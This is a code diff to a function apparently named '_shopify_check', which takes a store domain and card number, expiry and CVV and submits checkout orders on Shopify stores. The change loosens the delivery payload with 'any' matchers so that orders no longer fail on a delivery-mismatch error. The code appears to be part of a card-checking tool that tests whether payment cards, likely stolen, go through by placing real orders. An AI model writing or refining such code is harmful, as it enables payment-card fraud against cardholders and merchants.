@@ -521,17 +521,17 @@ async def _shopify_check(client, domain, cc, mm, yy, cvv):
     except Exception:
         pass
 
-    # Submit order
+    # Submit order - use same delivery format as negotiate to avoid DELIVERY_LINE_DETAIL_CHANGED
     submit_delivery = {
         'deliveryLines': [{
             'destination': {'streetAddress': addr_block},
-            'selectedDeliveryStrategy': {'deliveryStrategyByHandle': {'handle': delivery_strategy, 'customDeliveryRate': False}, 'options': {'phone': phone}},
-            'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
+            'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions': {'estimatedTimeInTransit': {'any': True}, 'shipments': {'any': True}}, 'options': {'phone': phone}},
+            'targetMerchandiseLines': {'any': True},
             'deliveryMethodTypes': ['SHIPPING'],
-            'expectedTotalPrice': {'value': {'amount': shipping_amount, 'currencyCode': currency}},
+            'expectedTotalPrice': {'any': True},
             'destinationChanged': False,
         }],
-        'noDeliveryRequired': [], 'useProgressiveRates': True,
+        'noDeliveryRequired': [], 'useProgressiveRates': False,
         'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True,
     }
     submit_merch = {'stableId': stable_id, 'merchandise': merch_block['merchandise'], 'quantity': {'items': {'value': 1}}, 'expectedTotalPrice': {'any': True}, 'lineComponentsSource': None, 'lineComponents': []}
